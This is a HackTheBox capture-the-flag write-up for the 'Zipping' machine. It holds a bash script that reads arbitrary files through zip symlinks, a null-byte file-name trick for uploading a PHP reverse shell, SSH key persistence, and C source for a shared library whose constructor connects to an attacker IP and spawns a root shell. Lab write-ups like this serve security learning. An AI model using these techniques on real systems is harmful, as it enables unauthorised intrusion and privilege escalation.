# [Zipping](https://app.hackthebox.com/machines/Zipping) - 27/08/2023 - HackTheBox write-up


## User flag

### Discovery

We have a web app and a SSH server and nothing else, so it will be web exploitation.

After a few minutes, we can find an upload form, to upload a PDF in a Zip file.

### Searching for vulnerability

So, I tried some classic Zip vulnerability, Zip slip and Zip symlinks. The second method seems to work, and we can read arbitrary file from the server. I use the following script:
```bash
#!/bin/bash

HOST="http://10.10.11.229"
PROXY="http://127.0.0.1:8080"

zip="link.zip"
pdf="link.pdf"

file=$1     # We supply the file as parameter

rm -f ${pdf} ${zip}
ln -s ../../../../../../../../../..${file} ${pdf}
zip --symlinks ${zip} ${pdf}

uploaded_file=$(curl -s -k -x "${PROXY}" \
    -F zipFile=@${zip} -F submit="" \
    ${HOST}/upload.php \
    | grep -Eo "uploads/[a-f0-9]+/${pdf}" | head -n 1)

curl -k -x ${PROXY} ${HOST}/${uploaded_file}
```

### Exploitation

Then I started searching for interesting file, configuration, source code etc... And I find a username `rektsu` in a configuration file. So, I tried to read `/home/rektsu/user.txt` and it works, because he's the Apache user. But I don't think it was the intended way because after obtaining the flag, I'm just stuck for the next steps.

### Obtain a shell access

Finally we can read the flag this way but there is another step to obtain a shell on the machine as `rektsu`. We need to exploit the upload feature to upload a PHP script to run a reverse shell first.

By inspecting the code we can see that is vulnerable to a null byte injection in the name of the uploaded file because it uses only the `pathinfo` function. So we need to upload a reverse shell with for example the name : `revshell.php%00.pdf`, to pass the extension verification.

The problem is we can only upload a Zip file, and we cannot add null byte in the name of real file on a system. So we need to use another trick. The trick is:
    - Create a classic PHP reverse shell
    - Name it: `revshell.php0.pdf` (with `0` can be any ASCII char)
    - Compress it with zip
    - Edit the zip with an hex editor (for example `ghex`) and replace the previous character in the name (`0`) with a null byte (`00`) at the end of the archive.

With this, the zip file remains correct, the extension check accept it, but when extract it with `7z` the file will be `revshell.php` because the null byte means the end of the string in the zip. So we can access our newly uploaded script and obtain the shell.

## Root flag

### Searching for elevating privileges

The privilege escalation part was easier than the user part. First we can upload a SSH public key to the `rektsu` account to obtain a persistant access. Two things to remember for a working SSH access:
    - Name the keys `id_rsa` and `id_rsa.pub`, don't rename it
    - Change rights of the `.ssh` directory and `authorized_keys` if needed:
        - `chmod 0700 .ssh/`
        - `chmod 0640 .ssh/authorized_keys`

After that we can start searching for any way to do privilege escalation. It's easier to find, just with a `sudo -l`:
```bash
$ sudo -l
[...]
User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

This executable is an ELF binary, we probably needs to do a little bit of reverse engineering. We can get back the binary to our attack machine to inspect it. First after running it, the program ask us a password. By running a simple `strings` or directly opening it with `Ghidra` we can find the password: `St0ckM4nager`.

Then, in `Ghidra` we can find that there is a `dlopen` call to open a dynamic library in the program, right after submitting the password. With a xor, the name of the library is hidden, but we can easily retrieve by running the executable with `strace`:
```
$ strace ./stock
[...]
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (Aucun fichier ou dossier de ce type)
write(1, "\n================== Menu ======="..., 44
```

So, the program load the library `/home/rektsu/.config/libcounter.so`. Fortunately for us, this folder is writeable by `rektsu`. So, we need to create a shared library to execute arbitrary code as `root` user.

### Exploitation

To do this, I tried first to overload the `printf` function to let the program call my code at the next execution of `printf`. But it doesn't work because the program execute the real `printf` function. So, I kept searching for a way, and I find this resource: [link](https://www.secureideas.com/blog/2021/ldpreload-runcode.html).

We can run specials functions at the beginning and the end of the loading of the library with particular attributes. I wrote this little library:
```C
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "10.10.14.184"
#define REMOTE_PORT 56385

int run_rev_shell(void)
{
    printf("[+] Start reverse shell");
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/bash", 0, 0);
    return 0;
}

void __attribute__((constructor)) run_me_first() {
    printf("[+] Loading libcounter.so");
    run_rev_shell();
}

void __attribute__((constructor)) run_me_last() {
    printf("[+] Exiting");
}
```

Then we compile it this way: 
```bash
$ gcc -fPIC -shared -o libcounter.so rev.c
```

The final step was to upload our library to the desired place `/home/rektsu/.config/libcounter.so`, and run:
```bash
sudo /usr/bin/stock
```

We obtain a reverse shell from our listener and we can get the root flag !
